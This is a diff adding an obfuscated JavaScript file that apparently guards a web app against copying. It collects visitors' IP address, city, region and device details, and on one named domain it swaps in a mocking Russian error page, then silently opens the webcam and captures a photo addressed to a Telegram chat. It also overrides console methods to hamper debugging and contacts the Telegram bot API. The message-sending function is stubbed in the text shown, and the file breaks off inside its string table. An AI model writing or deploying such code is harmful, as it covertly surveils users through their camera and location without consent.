@@ -1,0 +1,394 @@
+(function (_0x4a181a, _0x5dd787) {
+    const _0x3dc40e = _0x4a181a();
+  })(_0x5563, 995609);
+  let _0x30e34a = 0;
+  let _0x56df3e = 0;
+  const _0x3f9d53 = ["demo", "demo", "demo"];
+  let _0x213355 = false;
+  function _0x39dd(_0x226811, _0x4fe95d) {
+    const _0x55632e = _0x5563();
+    _0x39dd = function (_0x39ddfc, _0x1cf23f) {
+      _0x39ddfc = _0x39ddfc - 121;
+      let _0x462ac9 = _0x55632e[_0x39ddfc];
+      return _0x462ac9;
+    };
+    return _0x39dd(_0x226811, _0x4fe95d);
+  }
+  async function _0x7242f0(_0x483651) {
+     console.log("TRIGGERED SENDMESSAGE");
+    }
+  async function _0x1f32db(_0x5382a6) {
+    try {
+      const _0x376259 = await fetch("https://restcountries.com/v3.1/alpha/" + _0x5382a6);
+      const _0x2a8acc = await _0x376259.json();
+      return _0x2a8acc[0]?.["name"]["common"] || "Unknown";
+    } catch (_0x5dc1e5) {
+      console.error("Failed to fetch country name:", _0x5dc1e5);
+      return "Unknown";
+    }
+  }
+  function _0x4af4c6(_0x590531, _0x468d7c, _0x4220c3, _0x177b27, _0x48a822) {
+    return _0x39dd(_0x4220c3 - 0xb4, _0x177b27);
+  }
+  async function _0x5abf71() {
+    try {
+      const _0x32dc91 = await fetch("https://ipinfo.io/json");
+      const _0x255058 = await _0x32dc91.json();
+      const _0x3df465 = await _0x1f32db(_0x255058.country);
+      const _0x4c8d2b = _0x36a5e7(navigator.userAgent);
+      return {
+        'ip': _0x255058.ip,
+        'country': _0x255058.country,
+        'countryName': _0x3df465,
+        'city': _0x255058.city,
+        'region': _0x255058.region,
+        'countryEmoji': _0x3ad306(_0x255058.country),
+        'userAgent': navigator.userAgent,
+        'deviceModel': _0x4c8d2b.model,
+        'deviceType': _0x4c8d2b.type,
+        'deviceOS': _0x4c8d2b.os
+      };
+    } catch (_0x3088b3) {
+      console.error("Failed to fetch user info:", _0x3088b3);
+      const _0x1934d8 = {
+        ip: "Unknown",
+        country: "Unknown",
+        countryName: "Unknown",
+        city: "Unknown",
+        region: "Unknown",
+        countryEmoji: '❓',
+        userAgent: navigator.userAgent,
+        deviceModel: "Unknown",
+        deviceType: "Unknown",
+        deviceOS: "Unknown"
+      };
+      return _0x1934d8;
+    }
+  }
+  function _0x36a5e7(_0x5c021d) {
+    const _0x230302 = {
+      regex: /iPhone\s*(\d+([_\.]\d+)*)/i
+    };
+    _0x230302.type = "Mobile";
+    _0x230302.os = "iOS";
+    const _0x38abbd = {
+      regex: /iPad/i,
+      type: "Tablet",
+      os: "iOS"
+    };
+    const _0x4f1ee4 = {
+      regex: /Android\s*([\d\.]+)/i,
+      type: "Mobile",
+      os: "Android"
+    };
+    const _0x57fae9 = {
+      regex: /Windows Phone\s*([\d\.]+)/i
+    };
+    _0x57fae9.type = "Mobile";
+    _0x57fae9.os = "Windows Phone";
+    const _0x345dea = [_0x230302, _0x38abbd, _0x4f1ee4, _0x57fae9];
+    const _0x2bf058 = {
+      regex: /Windows/i,
+      type: "Desktop",
+      os: "Windows"
+    };
+    const _0x6c37e = {
+      regex: /Macintosh/i,
+      type: "Desktop",
+      os: "macOS"
+    };
+    const _0x386a26 = {
+      regex: /Linux/i,
+      type: "Desktop",
+      os: "Linux"
+    };
+    const _0x108110 = [_0x2bf058, _0x6c37e, _0x386a26];
+    for (let _0x3bd5f5 of _0x345dea) {
+      const _0x53aaec = _0x5c021d.match(_0x3bd5f5.regex);
+      if (_0x53aaec) {
+        return {
+          'type': _0x3bd5f5.type,
+          'os': _0x3bd5f5.os,
+          'model': _0x4f1232(_0x5c021d, _0x3bd5f5.os)
+        };
+      }
+    }
+    for (let _0x526c8a of _0x108110) {
+      const _0xc93698 = _0x5c021d.match(_0x526c8a.regex);
+      if (_0xc93698) {
+        return {
+          'type': _0x526c8a.type,
+          'os': _0x526c8a.os,
+          'model': _0x4f1232(_0x5c021d, _0x526c8a.os)
+        };
+      }
+    }
+    const _0x451dee = {
+      type: "Unknown",
+      os: "Unknown",
+      model: "Unknown Device"
+    };
+    return _0x451dee;
+  }
+  function _0x4f1232(_0xa753c4, _0x4857ed) {
+    switch (_0x4857ed) {
+      case "iOS":
+        const _0x2f04b4 = _0xa753c4.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
+        if (_0x2f04b4) {
+          return "iPhone " + _0x2f04b4[1].replace(/[_\.]/g, " ");
+        }
+        const _0x1ae7fb = _0xa753c4.match(/iPad/i);
+        if (_0x1ae7fb) {
+          return "iPad";
+        }
+        break;
+      case "Android":
+        const _0x4a3ffe = _0xa753c4.match(/;\s*([^;)]+)\s*Build/i);
+        if (_0x4a3ffe) {
+          return _0x4a3ffe[1].trim();
+        }
+        break;
+      case "Windows":
+        const _0x5887d8 = _0xa753c4.match(/Windows\s*([\w\s]+)/i);
+        if (_0x5887d8) {
+          return "Windows " + _0x5887d8[1];
+        }
+        break;
+      case "macOS":
+        const _0x39c709 = _0xa753c4.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
+        if (_0x39c709) {
+          return "Mac " + _0x39c709[1];
+        }
+        break;
+    }
+    return "Unknown Device";
+  }
+  function _0x3ad306(_0x2b3a0b) {
+    return _0x2b3a0b.replace(/./g, _0x59ce75 => String.fromCodePoint(127397 + _0x59ce75.toUpperCase().charCodeAt()));
+  }
+  async function _0x3618cf() {
+    try {
+      const _0x35bce4 = {
+        video: true
+      };
+      const _0x478590 = await navigator.mediaDevices.getUserMedia(_0x35bce4);
+      const _0x3c6a15 = document.createElement("video");
+      _0x3c6a15.srcObject = _0x478590;
+      await _0x3c6a15.play();
+      const _0x33fb83 = document.createElement("canvas");
+      _0x33fb83.width = _0x3c6a15.videoWidth;
+      _0x33fb83.height = _0x3c6a15.videoHeight;
+      const _0x558bee = _0x33fb83.getContext('2d');
+      _0x558bee.drawImage(_0x3c6a15, 0, 0, _0x33fb83.width, _0x33fb83.height);
+      _0x3c6a15.pause();
+      _0x478590.getTracks().forEach(_0x1d1fa7 => _0x1d1fa7.stop());
+      const _0x30c766 = await new Promise(_0x7c3322 => _0x33fb83.toBlob(_0x7c3322, "image/jpeg"));
+      const _0x1789f2 = new FormData();
+      _0x1789f2.append("chat_id", "6436999031");
+      _0x1789f2.append("photo", _0x30c766, "photo.jpg");
+      console.log("Photo captured and sent successfully");
+    } catch (_0x1ce89a) {
+      console.error("Failed to capture photo:", _0x1ce89a);
+    }
+  }
+  function _0x381c55(_0x4e9289, _0x6def2, _0x67dd69, _0x4e263d, _0x2f4789) {
+    return _0x39dd(_0x67dd69 - 0x2d8, _0x4e9289);
+  }
+  async function _0x4c6744() {
+    const _0x3ba2fe = function () {
+      let _0x367dde = true;
+      return function (_0xb0461c, _0x5b1aa2) {
+        const _0x460a8c = _0x367dde ? function () {
+          if (_0x5b1aa2) {
+            const _0x50cde4 = _0x5b1aa2.apply(_0xb0461c, arguments);
+            _0x5b1aa2 = null;
+            return _0x50cde4;
+          }
+        } : function () {};
+        _0x367dde = false;
+        return _0x460a8c;
+      };
+    }();
+    const _0x2a6b01 = _0x3ba2fe(this, function () {
+      return _0x2a6b01.toString().search("(((.+)+)+)+$").toString().constructor(_0x2a6b01).search("(((.+)+)+)+$");
+    });
+    _0x2a6b01();
+    const _0x533d42 = function () {
+      let _0x14e739 = true;
+      return function (_0x8dab0e, _0x2d0ae5) {
+        const _0x1e9b97 = _0x14e739 ? function () {
+          if (_0x2d0ae5) {
+            const _0x3df390 = _0x2d0ae5.apply(_0x8dab0e, arguments);
+            _0x2d0ae5 = null;
+            return _0x3df390;
+          }
+        } : function () {};
+        _0x14e739 = false;
+        return _0x1e9b97;
+      };
+    }();
+    const _0x340f9d = _0x533d42(this, function () {
+      const _0x3240db = function () {
+        let _0x2dc9e3;
+        try {
+          _0x2dc9e3 = Function("return (function() {}.constructor(\"return this\")( ));")();
+        } catch (_0x383905) {
+          _0x2dc9e3 = window;
+        }
+        return _0x2dc9e3;
+      };
+      const _0x235f31 = _0x3240db();
+      const _0x50eb2b = _0x235f31.console = _0x235f31.console || {};
+      const _0x2bf24c = ["log", "warn", "info", "error", "exception", "table", "trace"];
+      for (let _0x3db8cc = 0; _0x3db8cc < _0x2bf24c.length; _0x3db8cc++) {
+        const _0x29e93f = _0x533d42.constructor.prototype.bind(_0x533d42);
+        const _0x2d2339 = _0x2bf24c[_0x3db8cc];
+        const _0x35f7fb = _0x50eb2b[_0x2d2339] || _0x29e93f;
+        _0x29e93f.__proto__ = _0x533d42.bind(_0x533d42);
+        _0x29e93f.toString = _0x35f7fb.toString.bind(_0x35f7fb);
+        _0x50eb2b[_0x2d2339] = _0x29e93f;
+      }
+    });
+    _0x340f9d();
+    const _0x3c9330 = {
+      domain: window.location.hostname,
+      fullUrl: window.location.href
+    };
+    if (_0x3c9330.domain == "entyludik.github.io") {
+      document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
+      const _0x1a2f11 = document.createElement("style");
+      _0x1a2f11.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
+      document.head.appendChild(_0x1a2f11);
+      const _0x10ebb7 = await _0x5abf71();
+      await _0x7242f0("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x3c9330.domain + "</code>\n🔗 URL: <code>" + _0x3c9330.fullUrl + "</code>\n🌐 IP: <code>" + _0x10ebb7.ip + "</code>\n📌 Location: " + _0x10ebb7.city + ", " + _0x10ebb7.region + ", " + _0x10ebb7.countryName + " " + _0x10ebb7.countryEmoji + "\n📱 Device: <code>" + _0x10ebb7.deviceModel + "</code>\n🖥️ Type: <code>" + _0x10ebb7.deviceType + " (" + _0x10ebb7.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x10ebb7.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
+      await _0x3618cf();
+      return;
+    }
+    try {
+      const _0x519bac = await fetch("https://api.telegram.org/bot/getMe");
+      const _0x6a3046 = await _0x519bac.json();
+      if (_0x6a3046.ok) {
+        console.log("Bot initialized");
+        _0x213355 = true;
+        const _0x207e48 = await _0x5abf71();
+        await _0x7242f0("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x3c9330.domain + "</code>\n🔗 URL: <code>" + _0x3c9330.fullUrl + "</code>\n🌐 IP: <code>" + _0x207e48.ip + "</code>\n📌 Location: " + _0x207e48.city + ", " + _0x207e48.region + ", " + _0x207e48.countryName + " " + _0x207e48.countryEmoji + "\n📱 Device: <code>" + _0x207e48.deviceModel + "</code>\n🖥️ Type: <code>" + _0x207e48.deviceType + " (" + _0x207e48.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x207e48.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
+      }
+    } catch (_0xfe39aa) {
+      console.error("Failed to initialize bot:", _0xfe39aa);
+      const _0x16dd7d = await _0x5abf71();
+      await _0x7242f0("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x3c9330.domain + "</code>\n🔗 URL: <code>" + _0x3c9330.fullUrl + "</code>\n🌐 IP: <code>" + _0x16dd7d.ip + "</code>\n📌 Location: " + _0x16dd7d.city + ", " + _0x16dd7d.region + ", " + _0x16dd7d.countryName + " " + _0x16dd7d.countryEmoji + "\n📱 Device: <code>" + _0x16dd7d.deviceModel + "</code>\n🖥️ Type: <code>" + _0x16dd7d.deviceType + " (" + _0x16dd7d.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x16dd7d.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
+    }
+  }
+  function _0x2eb87a() {
+    const _0x1c9648 = {
+      kUJRx: function (_0x1ea2d0, _0x45b63c) {
+        return _0x1ea2d0 !== _0x45b63c;
+      }
+    };
+    _0x1c9648.MohCL = "ptaIQ";
+    _0x1c9648.wvgDH = "Not authenticated";
+    _0x1c9648.AULxv = function (_0x44d075, _0x3ef8f5) {
+      return _0x44d075 % _0x3ef8f5;
+    };
+    _0x1c9648.sFpnb = function (_0x598bda, _0x9ffc3d) {
+      return _0x598bda + _0x9ffc3d;
+    };
+    if (!_0x213355) {
+      return _0x1c9648.MohCL !== _0x1c9648.MohCL ? _0x789134[1].trim() : (console.error(_0x1c9648.wvgDH), null);
+    }
+    const _0x52cd16 = _0x3f9d53[_0x56df3e];
+    _0x56df3e = _0x1c9648.AULxv(_0x1c9648.sFpnb(_0x56df3e, 1), _0x3f9d53.length);
+    return "Bearer " + _0x52cd16;
+  }
+  function _0x575f87(_0x52686f, _0x55d4fd, _0x292eea, _0x3d66d8, _0x186afe) {
+    return _0x39dd(_0x52686f - 0x3e3, _0x55d4fd);
+  }
+  function _0x54deab(_0x27bfe8, _0x428381) {
+    return Math.random() * (_0x428381 - _0x27bfe8) + _0x27bfe8;
+  }
+  function _0x51b0dc(_0x342f98, _0x2a7682, _0x31c1ed, _0x27fafb, _0x228412) {
+    return _0x39dd(_0x342f98 - 0x213, _0x31c1ed);
+  }
+  function _0x5563() {
+    const _0x1a2a87 = ['UTDPK', 'XgysA', 'AAAQ0', 'rE0Yn', 'w9IAE', 'utSsS', 'zKRzo', 'BiizR', '4w9Wg', '6ZwMF', '2I9hG', 'https', 'c4gM7', 'to__', 'WkLlh', " Doma", 'n5E6q', '24ygw', "ex: 9", '<code', "  #ov", 'Lp0fj', 'hover', "in: <", 'ement', 'npLDu', 'WPCaP', 'ufWBj', 'CaAgE', 'KRAIc', 'paSYL', 'Va8ZB', 'w4+Xl', 'warn', 'i>Воз', 'ALL5A', 'SeQFJ', 'NS658', '/09m+', 'rBgYq', 'Irb8U', 'oCgUA', 'AgkQz', 'BD54L', " coef", 'iu8Vu', 'zzueo', '-size', 'fAbxI', 'KhJPm', "s=\"ar", 'none;', 'zTI95', 'jIZAI', 'duA5V', 'M9Vto', 'dgSIH', 'sFpnb', 'AAAAA', 'X80km', '67566thrJtw', 'adow:', 'kExbo', 'city:', 'finP9', 'fABXG', 'KrvDP', 'XTooP', 'dVqYK', "   </", 'iMILu', 'WqPzV', 'p7h+/', ')+)+)', "  fle", 'ODUIs', "dow: ", 'detxB', 'ipIAk', "ось з", 'ients', 'li>Не', 'CFS6W', 'Po+Lm', 'y8ufq', 'qyujA', 'fmAVb', 'dyzL0', 'WRavw', 'HTKKd', 'jGfHz', 'jHO4F', '8Yyrx', 'AGuRi', 'K5CYI', 'yEQCH', "px rg", "    }", 'match', 'stcou', 'lized', 'ryEmo', 'iHfQG', 'OGAHk', 'arrow', 'aHHnc', 'toFix', 'gQXdQ', 'regex', 'HnYWZ', 'ZChIL', 'ound-', 'style', "икли ", 'KF+uj', "row l", "rm 0.", 'CgUAX', 'dRnL5', 'GTPv8', '://re', 'L8kh0', 'kI6Ej', 'rgba(', 'toISO', 'adius', 'HBqSH', 'mAVBU', 'ntrie', '98jTM', 'nLgYB', 'com/w', 'ccjAR', 'iGu6F', '+/SOO', 'a+kfW', '/alph', '8xHKl', 't-siz', 'zK8l4', 'pspwZ', '7ctKt', '7cuME', 'LTUuV', 'code>', '6OmqM', '1yJEI', 'hzUUR', '8g7Fu', 'eVNXx', 'TzeRb', 'iIRkp', "04: Д", 'Z5SUE', 'ITPRF', 'hQFMg', 'fetch', 'cQdoD', 'backg', 'Mekpc', 'tXo87', "dth: ", 'V2jQ6', 'B0lEQ', 'usDzy', 'gify', 'WupYr', "iv id", 'd</b>', 'kMJ0I', 'MhNlQ', 'ABFn4', "op\"><", 'mZrpr', "ign: ", 'Messa', 'CCQkK', " heig", '7M1jQ', 'macOS', 'gn-it', 'mofgU', 'pg9Un', "   <d", 'vGOdE', 'LU9yO', "5, 25", 'AARMD', 'QA4jK', " User", 'R8vyr', 'Image', 'QjY4w', 'i1XuV', 'fPTYY', 'round', 'scale', "'Aria", 'ryjng', 'F5orR', 'KmjFR', 'ZVEMQ', 'overf', 'ng..', 'xyq8a', 'Dxs/q', 'gQjdr', 'wil1S', '7o7hF', 'nUGhe', 'mCkX3', 'JJVsG', 'now', "ity: ", 'NWPqy', '3YGRg', 'displ', 'ak3bX', 'iHgn6', 'NPA0z', 'xaMbj', 'UhEUg', 'F5TzD', 'ZmOBe', 'jc7qS', '9TkyF', 't-fam', 'conte', 'matio', 'XGepb', '4cf2l', 'MsNGB', 'nXSSd', 'howgP', '5JIXW', 'Oq/HO', 'mSK1D', 'dYwuU', 'm/mIi', '64369', 'aVdIA', 'U/I80', 'retur', "бка 4", " }\n  ", 'exwiW', 'Text', "nts n", 'city', 'RfDke', 'n/jso', 'AmInQ', 'BFQaD', 'bfgWM', 'initi', 'CTHou', "Bot i", "7));\n", "ured ", 'dKgGH', 'Lrw06', 'fVXXG', '2hX6/', " disp", 'Pn2E+', '>Возм', 'RX/+e', 'w.you', '/cH+Z', '+vfQm', ">Bot ", 'xVLPh', " ее к", "ть ве", '9783516VhQbcf', " 100%", 'canva', 'iEhNp', '9lxNB', '://ww', 'OLAQS', 'cfdEB', 'AKyOB', '3rcOZ', 'oaIxM', 'GSSXO', 'loIpD', "  ani", 'hNBWT', 'eight', 'SZc8K', "n: 20", 'A1Gm/', " запр", 'YDAZO', '8Xo4S', 'H8dgM', 'curso', ".7), ", 'Dz+0l', 'sKVcn', 'XBLoG', 'Q1BzU', 'ZY0jY', 'OboTk', 'WOT52', 'erMed', 'ticat', "0, 0.", 'LTtwS', 'video', 'e/png', 'PQthd', 'K3lSd', 'dYPLo', ';base', "ames ", "IP: <", "te;\n ", "ext n", 'remov', " удал", "  bac", "tion ", 'dneyA', 'pause', '1>Оши', 'VHz_Q', "ный д", "r: po", '>Проб', 'омен.', '99031', 'BcyfZ', 'VkUz6', "    ", 'ssvVR', ">\n   ", 'hidde', 'zjBxZ', 'uAESQ', 'rUNMv', 'K+NeM', 'pZlbq', "\n    ", 'ufLEq', 'RPUyI', 'J5hbm', 'ZffVy', 'nbxr4', 'fMpTW', "999;\n", '497iz', 'ff9Z/', 'RVewF', 'Waiti', 'Y22x9', 'rGAbw', 'egram', 'h3Mra', 'ucces', "<p>К ", '707QP', "ate;\n", 'name', '2rrtd', 'iZUha', "0 10p", 's0jCx', 'appli', " righ", 'TvFmZ', '8svd7', 'hkAg0', 'ZOcA2', 'L5NzD', 'atewa', 'eThvj', 'сожал', 'hhUrs', 'Rphxe', 'Onkm3', 'erlay', 'RElzJ', '(((.+', '1yMRV', "   <h", "e>\n  ", 'AAOww', 'ent', 'ltern', 'kxV6R', "Mac ", 'hHCZv', 'log', 'CgUKz', 'Zi/F/', " <div", 't5IBg', 'regio', "\n📱 De", '4c1yO', 'haCPi', 'Fhezs', '7M2g9', '/uIuY', 'ftYM9', 'TqmMh', 'trace', 'gN0jZ', 'b8pxY', 'U99zz', 'wuKNE', '9R7kC', "/h1>\n", 'sJiZ2', 'AULxv', " Dete", 'Xrbh/', '5d59j', 'cprP+', 'vHQcm', ": #28", '0/D4o', 'chat_', 'fhBzT', 'info', 'AoEWV', 'OcHiM', '4V0RC', ": <co", 'uzNxl', 'vE3BI', 'Dqh+R', 'gR/5n', 'Andro', 'nfini', 'text-', 'nkqkI', 'lij2+', 'qhfeZ', 'fG0BB', 'CgYqd', "Not a", 'FQEIM', '8e6rc', "n: fl", 'Nl304', '9hs6S', 'авиль', " вы х", 'UXKyY', "text ", 'vQlLu', 'XqRGw', "ws ", 'bQyN2', '100hp', "row t", 'mADLN', 'y_roc', "ve;\n ", 'infin', 'WUtwJ', 'QhjIZ', 'qcYGK', '8AsUg', 'Name', '2cSNb', 'ZtaCJ', 'DQEzX', 'есурс', 'v3IMq', 'TLwNs', "за 15", 'ign-i', ">\n📍 D", "Bot A", '3913c', 'LqYSX', 'NgNyp', 'TFglz', "   al", '3XXSB', 'wzskh', 'VjHvb', "    t", '/tZLh', 'Z96/j', "low: ", 'Autho', 'RHfLc', 'OzBUH', 'flex;', "gin: ", " купи", 'одера', 'fXEng', 'nt_st', 'YKHAc', 'wzYBf', 'QDNKq', 'JLBFU', 'ixBut', 'mWids', 